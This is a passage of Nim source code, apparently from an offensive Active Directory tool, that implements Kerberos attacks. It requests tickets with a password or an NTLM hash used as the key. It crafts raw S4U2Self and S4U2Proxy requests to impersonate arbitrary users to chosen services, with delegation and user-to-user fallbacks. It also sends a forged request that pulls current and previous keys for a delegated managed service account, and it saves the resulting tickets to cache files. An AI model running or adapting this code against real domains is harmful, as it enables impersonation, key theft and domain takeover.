      entry.vno = 0
      entry.key.enctype = 23
      entry.key.length = keyBytes.len.cuint
      entry.key.contents = cast[pointer](addr keyBytes[0])
      code = krb5_kt_add_entry(ctx, keytab, addr entry)
      if code != 0:
        result.message = "memory keytab add: " & krb5Error(ctx, code)
        return
      code = krb5_get_init_creds_keytab(ctx, addr tgt, client, keytab, 0, nil, opt)
    else:
      code = krb5_get_init_creds_password(ctx, addr tgt, client, password.cstring,
        nil, nil, 0, nil, opt)
    if code != 0:
      result.message = "TGT request failed: " & krb5Error(ctx, code)
      return
    code = krb5_cc_resolve(ctx, cacheName.cstring, addr cache)
    if code != 0:
      result.message = "ccache resolve: " & krb5Error(ctx, code)
      return
    code = krb5_cc_initialize(ctx, cache, client)
    if code != 0:
      result.message = "ccache initialize: " & krb5Error(ctx, code)
      return
    code = krb5_cc_store_cred(ctx, cache, addr tgt)
    if code != 0:
      result.message = "ccache store TGT: " & krb5Error(ctx, code)
      return
    if getService:
      code = krb5_parse_name(ctx, serverPrincipal.cstring, addr server)
      if code != 0:
        result.message = "service principal: " & krb5Error(ctx, code)
        return
      inCreds.client = client
      inCreds.server = server
      code = krb5_get_credentials(ctx, 0, cache, addr inCreds, addr outCreds)
      if code != 0:
        result.message = "TGS request failed: " & krb5Error(ctx, code)
        return
    result.success = true
    result.message = if getService: "TGT and service ticket stored" else: "TGT stored"
  finally:
    if outCreds != nil: krb5_free_creds(ctx, outCreds)
    if cache != nil: discard krb5_cc_close(ctx, cache)
    if keytab != nil: discard krb5_kt_close(ctx, keytab)
    if opt != nil: krb5_get_init_creds_opt_free(ctx, opt)
    if ctx != nil:
      krb5_free_cred_contents(ctx, addr tgt)
      if client != nil: krb5_free_principal(ctx, client)
      if server != nil: krb5_free_principal(ctx, server)
      if ntlmHash.len == 0:
        krb5_free_context(ctx)
    try: removeFile(cfgPath)
    except CatchableError: discard
    if hadOldConfig:
      putEnv("KRB5_CONFIG", oldConfig)
    else:
      delEnv("KRB5_CONFIG")

proc requestS4UProxyCcache*(kdc, realm, domain, impersonateUser, targetSpn,
                            sourceCcache, outCcache: string; timeoutMs = 5000;
                            sourceSpn = ""; rbcd = true; altService = ""): TicketRequestResult =
  result = TicketRequestResult(operation: "s4u", principal: impersonateUser,
    service: if altService.len > 0: altService else: targetSpn, ccache: outCcache)
  if impersonateUser.len == 0:
    result.message = "S4U requires --user <principal>"
    return
  if targetSpn.len == 0:
    result.message = "S4U requires --spn <service/host>"
    return
  if outCcache.len == 0:
    result.message = "S4U requires --out <ccache>"
    return

  let cfgPath = getTempDir() / ("nimux-krb5-" & $getCurrentProcessId() & "-" & $epochTime().int & ".conf")
  writeFile(cfgPath, buildKrb5Config(realm, domain, kdc))
  let oldConfig = if existsEnv("KRB5_CONFIG"): getEnv("KRB5_CONFIG") else: ""
  let hadOldConfig = existsEnv("KRB5_CONFIG")
  putEnv("KRB5_CONFIG", cfgPath)

  var ctx: Krb5Context = nil
  var source: Krb5Ccache = nil
  var dest: Krb5Ccache = nil
  var cachePrinc: Krb5Principal = nil
  var servicePrinc: Krb5Principal = nil
  var userPrinc: Krb5Principal = nil
  var targetPrinc: Krb5Principal = nil
  var tgtPrinc: Krb5Principal = nil
  var rawProxyCreds = Krb5Creds()
  var tgtReqCreds = Krb5Creds()
  var outTgt: ptr Krb5Creds = nil
  var sourceNameRaw: cstring = nil
  let sourceName =
    if sourceCcache.len > 0:
      if sourceCcache.startsWith("FILE:") or sourceCcache.startsWith("MEMORY:"): sourceCcache
      else: "FILE:" & sourceCcache
    elif existsEnv("KRB5CCNAME"):
      getEnv("KRB5CCNAME")
    else:
      ""
  let destName =
    if outCcache.startsWith("FILE:") or outCcache.startsWith("MEMORY:"): outCcache
    else: "FILE:" & outCcache
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    if sourceName.len > 0:
      code = krb5_cc_resolve(ctx, sourceName.cstring, addr source)
    else:
      code = krb5_cc_default(ctx, addr source)
    if code != 0:
      result.message = "source ccache: " & krb5Error(ctx, code)
      return
    code = krb5_cc_get_principal(ctx, source, addr cachePrinc)
    if code != 0:
      result.message = "source ccache principal: " & krb5Error(ctx, code)
      return
    code = krb5_unparse_name(ctx, cachePrinc, addr sourceNameRaw)
    if code != 0 or sourceNameRaw == nil:
      result.message = "source ccache principal name: " & krb5Error(ctx, code)
      return
    if sourceSpn.len > 0:
      code = krb5_parse_name(ctx, serviceName(sourceSpn, realm).cstring, addr servicePrinc)
      if code != 0:
        result.message = "source service principal: " & krb5Error(ctx, code)
        return
    else:
      servicePrinc = cachePrinc
    code = krb5_parse_name(ctx, principalName(impersonateUser, realm).cstring, addr userPrinc)
    if code != 0:
      result.message = "impersonated principal: " & krb5Error(ctx, code)
      return
    let storeSpn = if altService.len > 0: altService else: targetSpn
    code = krb5_parse_name(ctx, serviceName(storeSpn, realm).cstring, addr targetPrinc)
    if code != 0:
      result.message = "target service principal: " & krb5Error(ctx, code)
      return

    code = krb5_parse_name(ctx, serviceName("krbtgt/" & realm.toUpperAscii(), realm).cstring,
      addr tgtPrinc)
    if code != 0:
      result.message = "TGT service principal: " & krb5Error(ctx, code)
      return
    tgtReqCreds.client = cachePrinc
    tgtReqCreds.server = tgtPrinc
    code = krb5_get_credentials(ctx, 0, source, addr tgtReqCreds, addr outTgt)
    if code != 0:
      result.message = "TGT lookup failed: " & krb5Error(ctx, code)
      return
    if outTgt == nil or outTgt.ticket.length == 0 or outTgt.keyblock.length == 0:
      result.message = "TGT lookup returned no usable ticket"
      return
    let tgtTicket = rawData(outTgt.ticket)
    var kdcTime = int64(outTgt.times.authtime)
    var rawErr = ""
    var kdcStime: int64 = 0
    var rawSelfReq = buildRawS4U2SelfReq(ctx, realm, principalName(impersonateUser, realm),
      $sourceNameRaw, tgtTicket, addr outTgt.keyblock, rawErr, rbcd, kdcTime)
    if rawSelfReq.len == 0:
      result.message = "S4U2Self request build failed: " & rawErr
      return
    var rawSelfRep = kdcRequestTcp(kdc, rawSelfReq, timeoutMs)
    if rawSelfRep.len == 0:
      result.message = "S4U2Self failed: no KDC response"
      return
    var parsedSelf = parseRawTgsRepToCred(ctx, rawSelfRep, userPrinc, servicePrinc,
      addr outTgt.keyblock, rawErr, kdcStime)
    if rawErr.len > 0 and rawErr.contains("error 37") and kdcStime > 0:
      rawErr = ""
      kdcTime = kdcStime
      rawSelfReq = buildRawS4U2SelfReq(ctx, realm, principalName(impersonateUser, realm),
        $sourceNameRaw, tgtTicket, addr outTgt.keyblock, rawErr, rbcd, kdcTime)
      if rawSelfReq.len == 0:
        result.message = "S4U2Self request build failed: " & rawErr
        return
      rawSelfRep = kdcRequestTcp(kdc, rawSelfReq, timeoutMs)
      if rawSelfRep.len == 0:
        result.message = "S4U2Self failed: no KDC response"
        return
      var ignored: int64 = 0
      parsedSelf = parseRawTgsRepToCred(ctx, rawSelfRep, userPrinc, servicePrinc,
        addr outTgt.keyblock, rawErr, ignored)
    var usedU2U = false
    let needU2U = (rawErr.len > 0 and rawErr.contains("error 7")) or
                  (rawErr.len == 0 and (parsedSelf.flags and 0x40000000) == 0)
    if needU2U:
      rawErr = ""
      var kdcStime2: int64 = 0
      rawSelfReq = buildRawS4U2SelfReq(ctx, realm, principalName(impersonateUser, realm),
        $sourceNameRaw, tgtTicket, addr outTgt.keyblock, rawErr, rbcd, kdcTime, u2u=true)
      if rawSelfReq.len == 0:
        result.message = "S4U2Self (u2u) request build failed: " & rawErr
        return
      rawSelfRep = kdcRequestTcp(kdc, rawSelfReq, timeoutMs)
      if rawSelfRep.len == 0:
        result.message = "S4U2Self (u2u) failed: no KDC response"
        return
      parsedSelf = parseRawTgsRepToCred(ctx, rawSelfRep, userPrinc, servicePrinc,
        addr outTgt.keyblock, rawErr, kdcStime2)
      if rawErr.len == 0:
        usedU2U = true
    if rawErr.len > 0:
      result.message = "S4U2Self failed: " & rawErr
      return
    let evidenceTicket = parsedSelf.ticket
    let rawReq = buildRawS4U2ProxyReq(ctx, realm, principalName(impersonateUser, realm),
      targetSpn, $sourceNameRaw, tgtTicket, evidenceTicket, addr outTgt.keyblock,
      rawErr, rbcd, kdcTime, u2u=false, evidenceIsU2U=usedU2U)
    if rawReq.len == 0:
      result.message = "S4U2Proxy request build failed: " & rawErr
      return
    let rawRep = kdcRequestTcp(kdc, rawReq, timeoutMs)
    if rawRep.len == 0:
      result.message = "S4U2Proxy failed: no KDC response"
      return
    var ignored2: int64 = 0
    var parsedProxy = parseRawTgsRepToCred(ctx, rawRep, userPrinc, targetPrinc,
      addr outTgt.keyblock, rawErr, ignored2)
    if rawErr.len > 0 and rawErr.contains("error 13"):
      rawErr = ""
      let rawReqU2U = buildRawS4U2ProxyReq(ctx, realm,
        principalName(impersonateUser, realm), targetSpn, $sourceNameRaw,
        tgtTicket, evidenceTicket, addr outTgt.keyblock, rawErr, rbcd,
        kdcTime, u2u=true, evidenceIsU2U=usedU2U)
      if rawReqU2U.len > 0:
        let rawRepU2U = kdcRequestTcp(kdc, rawReqU2U, timeoutMs)
        if rawRepU2U.len > 0:
          var ignored3: int64 = 0
          parsedProxy = parseRawTgsRepToCred(ctx, rawRepU2U, userPrinc,
            targetPrinc, addr outTgt.keyblock, rawErr, ignored3)
    if rawErr.len > 0:
      result.message = "S4U2Proxy failed: " & rawErr
      return
    code = krb5_cc_resolve(ctx, destName.cstring, addr dest)
    if code != 0:
      result.message = "destination ccache: " & krb5Error(ctx, code)
      return
    code = krb5_cc_initialize(ctx, dest, userPrinc)
    if code != 0:
      result.message = "destination ccache initialize: " & krb5Error(ctx, code)
      return
    var keyValue = parsedProxy.keyValue
    var ticketValue = parsedProxy.ticket
    rawProxyCreds.client = userPrinc
    rawProxyCreds.server = targetPrinc
    rawProxyCreds.keyblock = Krb5Keyblock(magic: 0,
      enctype: Krb5Enctype(parsedProxy.keyType), length: cuint(keyValue.len),
      contents: if keyValue.len > 0: cast[pointer](addr keyValue[0]) else: nil)
    rawProxyCreds.times = parsedProxy.times
    rawProxyCreds.ticketFlags = Krb5Flags(parsedProxy.flags)
    rawProxyCreds.ticket = Krb5Data(magic: 0, length: cuint(ticketValue.len),
      data: if ticketValue.len > 0: cast[cstring](addr ticketValue[0]) else: nil)
    code = krb5_cc_store_cred(ctx, dest, addr rawProxyCreds)
    if code != 0:
      result.message = "destination ccache store S4U2Proxy: " & krb5Error(ctx, code)
      return
    result.success = true
    result.ccache = destName
    result.message = "S4U2Proxy service ticket stored"
  finally:
    if sourceNameRaw != nil: krb5_free_unparsed_name(ctx, sourceNameRaw)
    if outTgt != nil: krb5_free_creds(ctx, outTgt)
    if dest != nil: discard krb5_cc_close(ctx, dest)
    if source != nil: discard krb5_cc_close(ctx, source)
    if ctx != nil:
      if userPrinc != nil: krb5_free_principal(ctx, userPrinc)
      if targetPrinc != nil: krb5_free_principal(ctx, targetPrinc)
      if tgtPrinc != nil: krb5_free_principal(ctx, tgtPrinc)
      if servicePrinc != nil and servicePrinc != cachePrinc:
        krb5_free_principal(ctx, servicePrinc)
      if cachePrinc != nil: krb5_free_principal(ctx, cachePrinc)
      krb5_free_context(ctx)
    try: removeFile(cfgPath)
    except CatchableError: discard
    if hadOldConfig:
      putEnv("KRB5_CONFIG", oldConfig)
    else:
      delEnv("KRB5_CONFIG")

proc requestS4USelfCcache*(kdc, realm, domain, impersonateUser,
                           sourceCcache, outCcache: string; timeoutMs = 5000;
                           altService = ""): TicketRequestResult =
  result = TicketRequestResult(operation: "s4u2self", principal: impersonateUser,
    service: altService, ccache: outCcache)
  if impersonateUser.len == 0:
    result.message = "S4U2Self requires --user <principal>"
    return
  if outCcache.len == 0:
    result.message = "S4U2Self requires --out <ccache>"
    return

  let cfgPath = getTempDir() / ("nimux-krb5-" & $getCurrentProcessId() & "-" & $epochTime().int & ".conf")
  writeFile(cfgPath, buildKrb5Config(realm, domain, kdc))
  let oldConfig = if existsEnv("KRB5_CONFIG"): getEnv("KRB5_CONFIG") else: ""
  let hadOldConfig = existsEnv("KRB5_CONFIG")
  putEnv("KRB5_CONFIG", cfgPath)

  var ctx: Krb5Context = nil
  var source: Krb5Ccache = nil
  var dest: Krb5Ccache = nil
  var cachePrinc: Krb5Principal = nil
  var userPrinc: Krb5Principal = nil
  var targetPrinc: Krb5Principal = nil
  var tgtPrinc: Krb5Principal = nil
  var rawSelfCreds = Krb5Creds()
  var tgtReqCreds = Krb5Creds()
  var outTgt: ptr Krb5Creds = nil
  var sourceNameRaw: cstring = nil
  let sourceName =
    if sourceCcache.len > 0:
      if sourceCcache.startsWith("FILE:") or sourceCcache.startsWith("MEMORY:"): sourceCcache
      else: "FILE:" & sourceCcache
    elif existsEnv("KRB5CCNAME"):
      getEnv("KRB5CCNAME")
    else:
      ""
  let destName =
    if outCcache.startsWith("FILE:") or outCcache.startsWith("MEMORY:"): outCcache
    else: "FILE:" & outCcache
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    if sourceName.len > 0:
      code = krb5_cc_resolve(ctx, sourceName.cstring, addr source)
    else:
      code = krb5_cc_default(ctx, addr source)
    if code != 0:
      result.message = "source ccache: " & krb5Error(ctx, code)
      return
    code = krb5_cc_get_principal(ctx, source, addr cachePrinc)
    if code != 0:
      result.message = "source ccache principal: " & krb5Error(ctx, code)
      return
    code = krb5_unparse_name(ctx, cachePrinc, addr sourceNameRaw)
    if code != 0 or sourceNameRaw == nil:
      result.message = "source ccache principal name: " & krb5Error(ctx, code)
      return
    code = krb5_parse_name(ctx, principalName(impersonateUser, realm).cstring, addr userPrinc)
    if code != 0:
      result.message = "impersonated principal: " & krb5Error(ctx, code)
      return
    let storeSpn =
      if altService.len > 0: altService
      else: $sourceNameRaw
    code = krb5_parse_name(ctx, serviceName(storeSpn, realm).cstring, addr targetPrinc)
    if code != 0:
      result.message = "target service principal: " & krb5Error(ctx, code)
      return
    code = krb5_parse_name(ctx, serviceName("krbtgt/" & realm.toUpperAscii(), realm).cstring,
      addr tgtPrinc)
    if code != 0:
      result.message = "TGT service principal: " & krb5Error(ctx, code)
      return
    tgtReqCreds.client = cachePrinc
    tgtReqCreds.server = tgtPrinc
    code = krb5_get_credentials(ctx, 0, source, addr tgtReqCreds, addr outTgt)
    if code != 0:
      result.message = "TGT lookup failed: " & krb5Error(ctx, code)
      return
    if outTgt == nil or outTgt.ticket.length == 0 or outTgt.keyblock.length == 0:
      result.message = "TGT lookup returned no usable ticket"
      return

    let tgtTicket = rawData(outTgt.ticket)
    var rawErr = ""
    var kdcStime: int64 = 0
    var kdcTime = int64(outTgt.times.authtime)
    var rawSelfReq = buildRawS4U2SelfReq(ctx, realm, principalName(impersonateUser, realm),
      $sourceNameRaw, tgtTicket, addr outTgt.keyblock, rawErr, rbcd = true, kdcTime = kdcTime)
    if rawSelfReq.len == 0:
      result.message = "S4U2Self request build failed: " & rawErr
      return
    var rawSelfRep = kdcRequestTcp(kdc, rawSelfReq, timeoutMs)
    if rawSelfRep.len == 0:
      result.message = "S4U2Self failed: no KDC response"
      return
    var parsedSelf = parseRawTgsRepToCred(ctx, rawSelfRep, userPrinc, cachePrinc,
      addr outTgt.keyblock, rawErr, kdcStime)
    if rawErr.len > 0 and rawErr.contains("error 37") and kdcStime > 0:
      rawErr = ""
      kdcTime = kdcStime
      rawSelfReq = buildRawS4U2SelfReq(ctx, realm, principalName(impersonateUser, realm),
        $sourceNameRaw, tgtTicket, addr outTgt.keyblock, rawErr, rbcd = true, kdcTime = kdcTime)
      if rawSelfReq.len == 0:
        result.message = "S4U2Self request build failed: " & rawErr
        return
      rawSelfRep = kdcRequestTcp(kdc, rawSelfReq, timeoutMs)
      if rawSelfRep.len == 0:
        result.message = "S4U2Self failed: no KDC response"
        return
      var ignored: int64 = 0
      parsedSelf = parseRawTgsRepToCred(ctx, rawSelfRep, userPrinc, cachePrinc,
        addr outTgt.keyblock, rawErr, ignored)
    if rawErr.len > 0:
      result.message = "S4U2Self failed: " & rawErr
      return

    code = krb5_cc_resolve(ctx, destName.cstring, addr dest)
    if code != 0:
      result.message = "destination ccache: " & krb5Error(ctx, code)
      return
    code = krb5_cc_initialize(ctx, dest, userPrinc)
    if code != 0:
      result.message = "destination ccache initialize: " & krb5Error(ctx, code)
      return
    var keyValue = parsedSelf.keyValue
    var ticketValue = parsedSelf.ticket
    rawSelfCreds.client = userPrinc
    rawSelfCreds.server = targetPrinc
    rawSelfCreds.keyblock = Krb5Keyblock(magic: 0,
      enctype: Krb5Enctype(parsedSelf.keyType), length: cuint(keyValue.len),
      contents: if keyValue.len > 0: cast[pointer](addr keyValue[0]) else: nil)
    rawSelfCreds.times = parsedSelf.times
    rawSelfCreds.ticketFlags = Krb5Flags(parsedSelf.flags)
    rawSelfCreds.ticket = Krb5Data(magic: 0, length: cuint(ticketValue.len),
      data: if ticketValue.len > 0: cast[cstring](addr ticketValue[0]) else: nil)
    code = krb5_cc_store_cred(ctx, dest, addr rawSelfCreds)
    if code != 0:
      result.message = "destination ccache store S4U2Self: " & krb5Error(ctx, code)
      return
    result.success = true
    result.ccache = destName
    result.message = "S4U2Self service ticket stored"
  finally:
    if sourceNameRaw != nil: krb5_free_unparsed_name(ctx, sourceNameRaw)
    if outTgt != nil: krb5_free_creds(ctx, outTgt)
    if dest != nil: discard krb5_cc_close(ctx, dest)
    if source != nil: discard krb5_cc_close(ctx, source)
    if ctx != nil:
      if userPrinc != nil: krb5_free_principal(ctx, userPrinc)
      if targetPrinc != nil: krb5_free_principal(ctx, targetPrinc)
      if tgtPrinc != nil: krb5_free_principal(ctx, tgtPrinc)
      if cachePrinc != nil: krb5_free_principal(ctx, cachePrinc)
      krb5_free_context(ctx)
    try: removeFile(cfgPath)
    except CatchableError: discard
    if hadOldConfig:
      putEnv("KRB5_CONFIG", oldConfig)
    else:
      delEnv("KRB5_CONFIG")

proc parseDmsaKeyPackageFromPlain(plain: string): tuple[current, prev: seq[DmsaKeyEntry]] =
  let encTop = readTlv(plain)
  if encTop.tag != 0x7a: return
  let encSeq = readTlv(encTop.body)
  if encSeq.tag != 0x30: return
  let paDataCtx = fieldBody(encSeq.body, 0xac)
  if paDataCtx.len == 0: return
  let paListOuter = readTlv(paDataCtx)
  let paList = if paListOuter.tag == 0x30: paListOuter.body else: paDataCtx
  for entry in children(paList):
    if entry.tag != 0x30: continue
    var paType = 0
    var paValue = ""
    for sub in children(entry.body):
      case sub.tag
      of 0xa1: paType = intValue(sub.body)
      of 0xa2:
        let v = readTlv(sub.body)
        if v.tag == 0x04: paValue = v.body
      else: discard
    if paType != 171 or paValue.len == 0: continue
    let pkg = readTlv(paValue)
    if pkg.tag != 0x30: continue
    for kf in children(pkg.body):
      let isCurrent = kf.tag == 0xa0
      let isPrev = kf.tag == 0xa1
      if not (isCurrent or isPrev): continue
      let keysOuter = readTlv(kf.body)
      let keysBody = if keysOuter.tag == 0x30: keysOuter.body else: kf.body
      for keyEntry in children(keysBody):
        if keyEntry.tag != 0x30: continue
        var enctype = 0
        var keyVal = ""
        for kef in children(keyEntry.body):
          case kef.tag
          of 0xa0: enctype = intValue(kef.body)
          of 0xa1:
            let t = readTlv(kef.body)
            if t.tag == 0x04: keyVal = t.body
          else: discard
        let e = DmsaKeyEntry(enctype: enctype, keyHex: toHex(keyVal))
        if isPrev: result.prev.add e
        else: result.current.add e

proc buildRawS4UDmsaReq(ctx: Krb5Context; realm, dmsaSam, sourceName,
                        tgtTicket: string; tgtKey: ptr Krb5Keyblock;
                        err: var string; kdcTime: int64 = 0): string =
  randomize()
  let apReq = buildApReq(ctx, realm, sourceName, tgtTicket, tgtKey, err, kdcTime)
  if apReq.len == 0: return ""
  let userRealm = realm.toLowerAscii()
  let reqRealm = realm.toUpperAscii()
  let nonce = rand(0x7fffffff)
  let userId = seqT(
    ctx(0, derInt(nonce)) &
    ctx(1, principal(1, @[dmsaSam])) &
    ctx(2, genStr(userRealm)) &
    ctx(4, "\x03\x02\x03\x28")
  )
  var userIdCopy = userId
  var cksum: Krb5Checksum
  var userIdData = Krb5Data(magic: 0, length: cuint(userIdCopy.len),
    data: if userIdCopy.len > 0: cast[cstring](addr userIdCopy[0]) else: nil)
  let ccode = krb5_c_make_checksum(ctx, 0, tgtKey, 26, addr userIdData, addr cksum)
  if ccode != 0:
    err = "PA_S4U_X509_USER checksum failed: " & krb5Error(ctx, ccode)
    return ""
  var cksumData = newString(int(cksum.length))
  if cksum.contents != nil and cksum.length > 0:
    copyMem(addr cksumData[0], cksum.contents, int(cksum.length))
  let cksumType = int(cksum.checksumType)
  krb5_free_checksum_contents(ctx, addr cksum)
  let s4uUser = seqT(ctx(0, userId) & ctx(1, checksum(cksumType, cksumData)))
  let paTgs = seqT(ctx(1, derInt(1)) & ctx(2, octet(apReq)))
  let paX509 = seqT(ctx(1, derInt(130)) & ctx(2, octet(s4uUser)))
  let etypes = seqT(derInt(tgtKey.enctype) & derInt(18) & derInt(17) & derInt(23))
  let opts = bitString([byte 0x40, 0x81, 0x00, 0x00])
  let nowUnix = if kdcTime > 0: kdcTime else: getTime().toUnix()
  let body = seqT(
    ctx(0, opts) &
    ctx(2, genStr(reqRealm)) &
    ctx(3, principal(0, @["krbtgt", reqRealm])) &
    ctx(5, kerberosTimeFromUnix(nowUnix + 86400)) &
    ctx(7, derInt(rand(0x7fffffff))) &
    ctx(8, etypes)
  )
  app(12, seqT(
    ctx(1, derInt(5)) &
    ctx(2, derInt(12)) &
    ctx(3, seqT(paTgs & paX509)) &
    ctx(4, body)
  ))

proc requestDmsaKeys*(kdc, realm, domain, dmsaSam, sourceCcache, outCcache: string;
                     timeoutMs = 5000): DmsaKeysResult =
  result = DmsaKeysResult(operation: "dmsa-keys", principal: dmsaSam, ccache: outCcache)
  let cfgPath = getTempDir() / ("nimux-krb5-" & $getCurrentProcessId() & "-" & $epochTime().int & ".conf")
  writeFile(cfgPath, buildKrb5Config(realm, domain, kdc))
  let oldConfig = if existsEnv("KRB5_CONFIG"): getEnv("KRB5_CONFIG") else: ""
  let hadOldConfig = existsEnv("KRB5_CONFIG")
  putEnv("KRB5_CONFIG", cfgPath)
  var ctx: Krb5Context = nil
  var source: Krb5Ccache = nil
  var dest: Krb5Ccache = nil
  var cachePrinc: Krb5Principal = nil
  var dmsaPrinc: Krb5Principal = nil
  var krbtgtPrinc: Krb5Principal = nil
  var tgtPrinc: Krb5Principal = nil
  var tgtReqCreds = Krb5Creds()
  var rawDmsaCreds = Krb5Creds()
  var outTgt: ptr Krb5Creds = nil
  var sourceNameRaw: cstring = nil
  let sourceName =
    if sourceCcache.len > 0:
      if sourceCcache.startsWith("FILE:") or sourceCcache.startsWith("MEMORY:"): sourceCcache
      else: "FILE:" & sourceCcache
    elif existsEnv("KRB5CCNAME"):
      getEnv("KRB5CCNAME")
    else:
      ""
  let destName =
    if outCcache.len > 0:
      if outCcache.startsWith("FILE:") or outCcache.startsWith("MEMORY:"): outCcache
      else: "FILE:" & outCcache
    else:
      sourceName
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      result.message = "krb5_init_context failed"
      return
    if sourceName.len > 0:
      code = krb5_cc_resolve(ctx, sourceName.cstring, addr source)
    else:
      code = krb5_cc_default(ctx, addr source)
    if code != 0:
      result.message = "source ccache: " & krb5Error(ctx, code)
      return
    code = krb5_cc_get_principal(ctx, source, addr cachePrinc)
    if code != 0:
      result.message = "source ccache principal: " & krb5Error(ctx, code)
      return
    code = krb5_unparse_name(ctx, cachePrinc, addr sourceNameRaw)
    if code != 0 or sourceNameRaw == nil:
      result.message = "source ccache principal name: " & krb5Error(ctx, code)
      return
    code = krb5_parse_name(ctx, serviceName("krbtgt/" & realm.toUpperAscii(), realm).cstring,
      addr tgtPrinc)
    if code != 0:
      result.message = "TGT service principal: " & krb5Error(ctx, code)
      return
    tgtReqCreds.client = cachePrinc
    tgtReqCreds.server = tgtPrinc
    code = krb5_get_credentials(ctx, 0, source, addr tgtReqCreds, addr outTgt)
    if code != 0:
      result.message = "TGT lookup failed: " & krb5Error(ctx, code)
      return
    if outTgt == nil or outTgt.ticket.length == 0 or outTgt.keyblock.length == 0:
      result.message = "TGT lookup returned no usable ticket"
      return
    let tgtTicket = rawData(outTgt.ticket)
    var kdcTime = int64(outTgt.times.authtime)
    var rawErr = ""
    var kdcStime: int64 = 0
    var rawReq = buildRawS4UDmsaReq(ctx, realm, dmsaSam, $sourceNameRaw,
      tgtTicket, addr outTgt.keyblock, rawErr, kdcTime)
    if rawReq.len == 0:
      result.message = "dMSA S4U request build failed: " & rawErr
      return
    var rawRep = kdcRequestTcp(kdc, rawReq, timeoutMs)
    if rawRep.len == 0:
      result.message = "dMSA S4U request: no KDC response"
      return
    code = krb5_parse_name(ctx, principalName(dmsaSam, realm).cstring, addr dmsaPrinc)
    if code != 0:
      result.message = "dMSA principal: " & krb5Error(ctx, code)
      return
    code = krb5_parse_name(ctx, serviceName("krbtgt/" & realm.toUpperAscii(), realm).cstring,
      addr krbtgtPrinc)
    if code != 0:
      result.message = "krbtgt principal: " & krb5Error(ctx, code)
      return
    var parsedTgs = parseRawTgsRepToCred(ctx, rawRep, dmsaPrinc, krbtgtPrinc,
      addr outTgt.keyblock, rawErr, kdcStime)
    if rawErr.len > 0 and rawErr.contains("error 37") and kdcStime > 0:
      rawErr = ""
      kdcTime = kdcStime
      rawReq = buildRawS4UDmsaReq(ctx, realm, dmsaSam, $sourceNameRaw,
        tgtTicket, addr outTgt.keyblock, rawErr, kdcTime)
      if rawReq.len == 0:
        result.message = "dMSA S4U request build failed (skew retry): " & rawErr
        return
      rawRep = kdcRequestTcp(kdc, rawReq, timeoutMs)
      if rawRep.len == 0:
        result.message = "dMSA S4U request (skew retry): no KDC response"
        return
      var ignored: int64 = 0
      parsedTgs = parseRawTgsRepToCred(ctx, rawRep, dmsaPrinc, krbtgtPrinc,
        addr outTgt.keyblock, rawErr, ignored)
    if rawErr.len > 0:
      result.message = "dMSA S4U TGS-REP parse failed: " & rawErr
      return
    let keys = parseDmsaKeyPackageFromPlain(parsedTgs.decPlain)
    result.currentKeys = keys.current
    result.prevKeys = keys.prev
    if destName.len > 0:
      code = krb5_cc_resolve(ctx, destName.cstring, addr dest)
      if code != 0:
        result.message = "destination ccache: " & krb5Error(ctx, code)
        return
      code = krb5_cc_initialize(ctx, dest, dmsaPrinc)
      if code != 0:
        result.message = "destination ccache initialize: " & krb5Error(ctx, code)
        return
      var keyValue = parsedTgs.keyValue
      var ticketValue = parsedTgs.ticket
      rawDmsaCreds.client = dmsaPrinc
      rawDmsaCreds.server = krbtgtPrinc
      rawDmsaCreds.keyblock = Krb5Keyblock(magic: 0,
        enctype: Krb5Enctype(parsedTgs.keyType), length: cuint(keyValue.len),
        contents: if keyValue.len > 0: cast[pointer](addr keyValue[0]) else: nil)
      rawDmsaCreds.times = parsedTgs.times
      rawDmsaCreds.ticketFlags = Krb5Flags(parsedTgs.flags)
      rawDmsaCreds.ticket = Krb5Data(magic: 0, length: cuint(ticketValue.len),
        data: if ticketValue.len > 0: cast[cstring](addr ticketValue[0]) else: nil)
      code = krb5_cc_store_cred(ctx, dest, addr rawDmsaCreds)
      if code != 0:
        result.message = "destination ccache store dMSA ticket: " & krb5Error(ctx, code)
        return
      result.ccache = destName
    result.success = true
    result.message = "dMSA key package retrieved"
  finally:
    if sourceNameRaw != nil: krb5_free_unparsed_name(ctx, sourceNameRaw)
    if outTgt != nil: krb5_free_creds(ctx, outTgt)
    if dest != nil: discard krb5_cc_close(ctx, dest)
    if source != nil: discard krb5_cc_close(ctx, source)
    if ctx != nil:
      if dmsaPrinc != nil: krb5_free_principal(ctx, dmsaPrinc)
      if krbtgtPrinc != nil: krb5_free_principal(ctx, krbtgtPrinc)
      if tgtPrinc != nil: krb5_free_principal(ctx, tgtPrinc)
      if cachePrinc != nil: krb5_free_principal(ctx, cachePrinc)
      krb5_free_context(ctx)
    try: removeFile(cfgPath)
    except CatchableError: discard
    if hadOldConfig:
      putEnv("KRB5_CONFIG", oldConfig)
    else:
      delEnv("KRB5_CONFIG")

proc randomBytes(n: int): string =
  randomize()
  for _ in 0 ..< n:
    result.add char(rand(255))

proc u32Le(v: int): string =
  result.add char(v and 0xff)
  result.add char((v shr 8) and 0xff)
  result.add char((v shr 16) and 0xff)
  result.add char((v shr 24) and 0xff)

proc rc4HmacEncrypt(key: string; usage: int; plain: string): string =
  let confounded = randomBytes(8) & plain
  let ki = smb.hmacMd5(key, u32Le(usage))
  let cksum = smb.hmacMd5(ki, confounded)
  let ke = smb.hmacMd5(ki, cksum)
  var rc4 = smb.rc4Init(ke)
  cksum & smb.rc4Process(rc4, confounded)

proc rc4HmacChecksum(key: string; usage: int; data: string): string =
  let ksign = smb.hmacMd5(key, "signaturekey\x00")
  let md5hash = smb.md5Digest(u32Le(usage) & data)
  smb.hmacMd5(ksign, md5hash)

proc krb5CryptoError(prefix: string; code: Krb5ErrorCode): string =
  prefix & " failed: krb5 error " & $code

proc krb5AesEncrypt(key: string; enctype: Krb5Enctype; usage: int; plain: string;
                    err: var string): string =
  if key.len == 0:
    err = "empty Kerberos AES key"
    return ""
  var ctx: Krb5Context = nil
  var keyCopy = key
  var plainCopy = plain
  var outLen: csize_t = 0
  var input = Krb5Data(magic: 0, length: cuint(plainCopy.len),
    data: if plainCopy.len > 0: cast[cstring](addr plainCopy[0]) else: nil)
  var keyblock = Krb5Keyblock(magic: 0, enctype: enctype, length: cuint(keyCopy.len),
    contents: if keyCopy.len > 0: cast[pointer](addr keyCopy[0]) else: nil)
  try:
    var code = krb5_init_context(addr ctx)
    if code != 0:
      err = krb5CryptoError("krb5_init_context", code)
      return ""
